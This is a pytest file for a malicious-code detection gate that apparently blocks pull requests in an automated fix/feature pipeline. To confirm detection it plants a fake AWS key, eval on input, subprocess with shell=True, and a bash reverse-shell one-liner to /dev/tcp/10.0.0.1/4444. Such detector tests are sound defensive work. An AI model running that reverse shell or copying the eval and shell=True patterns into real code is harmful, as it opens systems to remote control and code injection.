"""Tests for the malicious code detection gate."""

import os
import tempfile

from workers.celery_app import app


def test_task_registered():
    import workers.gates.malicious_code_gate  # noqa: F401

    assert "workers.gates.malicious_code_gate.malicious_code_gate" in app.tasks


# ── Test helpers ────────────────────────────────────────────────────────


def _create_temp_workspace(files: dict[str, str]) -> str:
    tmpdir = tempfile.mkdtemp()
    os.system(
        f"cd {tmpdir} && git init -b main && git config user.email test@test.com && git config user.name test"
    )
    for path, content in files.items():
        full_path = os.path.join(tmpdir, path)
        os.makedirs(os.path.dirname(full_path), exist_ok=True)
        with open(full_path, "w") as f:
            f.write(content)
    os.system(f"cd {tmpdir} && git add -A && git commit -m 'initial'")
    return tmpdir


def _add_files_and_commit(workspace: str, files: dict[str, str]) -> None:
    for path, content in files.items():
        full_path = os.path.join(workspace, path)
        os.makedirs(os.path.dirname(full_path), exist_ok=True)
        with open(full_path, "w") as f:
            f.write(content)
    os.system(f"cd {workspace} && git add -A && git commit -m 'add files' --allow-empty")


# ── HIGH severity blocks PR ─────────────────────────────────────────────


def test_high_severity_secret_blocks_gate():
    """HIGH severity secret (AWS key) must fail the gate (block PR)."""
    from workers.gates.malicious_code_gate import malicious_code_gate

    workspace = _create_temp_workspace({
        "src/main.py": "def existing():\n    return 42\n",
    })
    _add_files_and_commit(workspace, {
        "src/config.py": (
            "# WARNING: hardcoded key — test detection\n"
            'AWS_ACCESS_KEY = "AKIA1234ABCD5678EFGH"\n'
        ),
    })

    result = malicious_code_gate.run(workspace_path=workspace)
    assert result["passed"] is False, (
        f"Expected gate to fail with AWS key, got passed=True findings={result['findings']}"
    )
    aws_findings = [
        f
        for f in result["findings"]
        if "AWS Access Key" in f.get("description", "")
    ]
    assert len(aws_findings) > 0, f"Expected AWS key finding, got {result['findings']}"
    assert result["blocked_by"], "Expected blocked_by to be populated"


def test_high_severity_subprocess_blocks_gate():
    """HIGH severity subprocess call must fail the gate."""
    from workers.gates.malicious_code_gate import malicious_code_gate

    workspace = _create_temp_workspace({
        "src/main.py": "def existing():\n    return 42\n",
    })
    _add_files_and_commit(workspace, {
        "src/runner.py": (
            "import subprocess\n\n"
            "def run_command(cmd):\n"
            '    return subprocess.call(cmd, shell=True)\n'
        ),
    })

    result = malicious_code_gate.run(workspace_path=workspace)
    assert result["passed"] is False, (
        f"Expected gate to fail with subprocess, got passed=True findings={result['findings']}"
    )
    subprocess_findings = [
        f
        for f in result["findings"]
        if "subprocess" in f.get("description", "").lower()
    ]
    assert len(subprocess_findings) > 0, (
        f"Expected subprocess finding, got {result['findings']}"
    )


def test_high_severity_eval_blocks_gate():
    """HIGH severity eval() call must fail the gate."""
    from workers.gates.malicious_code_gate import malicious_code_gate

    workspace = _create_temp_workspace({
        "src/main.py": "x = 1\n",
    })
    _add_files_and_commit(workspace, {
        "src/eval_usage.py": (
            "def process_input(data):\n"
            "    return eval(data)\n"
        ),
    })

    result = malicious_code_gate.run(workspace_path=workspace)
    assert result["passed"] is False
    eval_findings = [
        f for f in result["findings"] if "eval" in f.get("description", "").lower()
    ]
    assert len(eval_findings) > 0, f"Expected eval finding, got {result['findings']}"


def test_high_severity_reverse_shell_blocks_gate():
    """HIGH severity reverse shell pattern must fail the gate."""
    from workers.gates.malicious_code_gate import malicious_code_gate

    workspace = _create_temp_workspace({
        "src/main.py": "x = 1\n",
    })
    _add_files_and_commit(workspace, {
        "src/exploit.sh": (
            "#!/bin/bash\n"
            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
        ),
    })

    result = malicious_code_gate.run(workspace_path=workspace)
    assert result["passed"] is False, (
        f"Expected gate to fail with reverse shell, got passed=True findings={result['findings']}"
    )
    shell_findings = [
        f
        for f in result["findings"]
        if "reverse" in f.get("description", "").lower()
        or "/dev/tcp" in f.get("description", "")
    ]
    assert len(shell_findings) > 0, (
        f"Expected reverse shell finding, got {result['findings']}"
    )


# ── LOW severity logged but doesn't block ───────────────────────────────


def test_low_severity_does_not_block():
    """LOW severity findings must be logged but gate passes."""
    from workers.gates.malicious_code_gate import malicious_code_gate

    workspace = _create_temp_workspace({
        "src/main.py": "def existing():\n    return 42\n",
    })
    # Create a file with a very long line (LOW severity obfuscated pattern)
    _add_files_and_commit(workspace, {
        "src/long_line.py": (
            "def handler():\n"
            "    pass\n"
            "# "
            + "x" * 600
            + "\n"
        ),
    })

    result = malicious_code_gate.run(workspace_path=workspace)
    # Should pass because only LOW severity findings exist
    # (no HIGH severity findings)
    low_findings = [f for f in result["findings"] if f.get("severity") == "LOW"]
    if low_findings:
        # If the long line matched, gate should still pass (LOW doesn't block)
        assert result["passed"] is True, (
            f"Expected pass with only LOW findings, got failed: {result['findings']}"
        )


def test_medium_severity_does_not_block():
    """MEDIUM severity findings (e.g., os import) logged but gate passes."""
    from workers.gates.malicious_code_gate import malicious_code_gate

    workspace = _create_temp_workspace({
        "src/main.py": "x = 1\n",
    })
    _add_files_and_commit(workspace, {
        "src/file_ops.py": (
            "import os\n\n"
            "def get_path():\n"
            '    return os.path.join("/tmp", "test")\n'
        ),
    })

    result = malicious_code_gate.run(workspace_path=workspace)
    os_findings = [f for f in result["findings"] if f.get("description", "").startswith("Import of 'os'")]
    if os_findings:
        # MEDIUM severity — should not block
        assert result["passed"] is True, (
            f"Expected pass with only MEDIUM os import, got failed: {result['findings']}"
        )
        assert all(f["severity"] in ("MEDIUM", "LOW") for f in result["findings"])


# ── False positive suppression ──────────────────────────────────────────


def test_false_positive_suppression():
    """False positive exclusions suppress common test/doc patterns."""
    from workers.gates.malicious_code_gate import malicious_code_gate

    workspace = _create_temp_workspace({
        "src/main.py": "def existing():\n    return 42\n",
    })
    _add_files_and_commit(workspace, {
        "src/example.py": (
            "# Example config for tests\n"
            'API_KEY = "your-api-key-here"\n'
            'SECRET = "test.secret.key"\n'
            'HOST = "example.com"\n'
        ),
    })

    result = malicious_code_gate.run(workspace_path=workspace)
    # The fake/example values should be suppressed by false positive exclusions
    # and should not produce HIGH severity findings
    high_findings = [f for f in result["findings"] if f.get("severity") == "HIGH"]
    assert len(high_findings) == 0, (
        f"Expected no HIGH findings from false positives, got {high_findings}"
    )


# ── Clean workspace passes ──────────────────────────────────────────────


def test_clean_workspace_passes():
    """A workspace with no malicious patterns passes the gate."""
    from workers.gates.malicious_code_gate import malicious_code_gate

    workspace = _create_temp_workspace({
        "src/main.py": "def existing():\n    return 42\n",
    })
    _add_files_and_commit(workspace, {
        "src/real_impl.py": (
            "def compute(x: int) -> int:\n"
            "    result = x * 2 + 1\n"
            "    return result\n"
        ),
    })

    result = malicious_code_gate.run(workspace_path=workspace)
    assert result["passed"] is True, (
        f"Expected clean workspace to pass, got findings={result['findings']}"
    )
    assert len(result["findings"]) == 0, (
        f"Expected zero findings for clean code, got {len(result['findings'])}"
    )


# ── Pipeline wiring ─────────────────────────────────────────────────────


def test_malicious_gate_in_pipeline_steps():
    """The malicious code gate step must appear in pipeline definitions."""
    from workers.orchestrator.pipelines import get_pipeline

    for pipeline_name in ("syntaro:fix", "syntaro:feature"):
        cfg = get_pipeline(pipeline_name)
        assert cfg is not None, f"Pipeline {pipeline_name} not found"
        steps = cfg.get("steps", [])
        task_names = [s.get("task", "") for s in steps]
        assert (
            "workers.gates.malicious_code_gate.malicious_code_gate" in task_names
        ), f"Missing gate step in {pipeline_name} pipeline"
        # Must appear before PR creation
        gate_idx = task_names.index(
            "workers.gates.malicious_code_gate.malicious_code_gate"
        )
        pr_idx = task_names.index(
            "workers.tasks.pr_creation.create_pull_request"
        )
        assert gate_idx < pr_idx, (
            f"Gate step must be before PR creation in {pipeline_name}"
        )
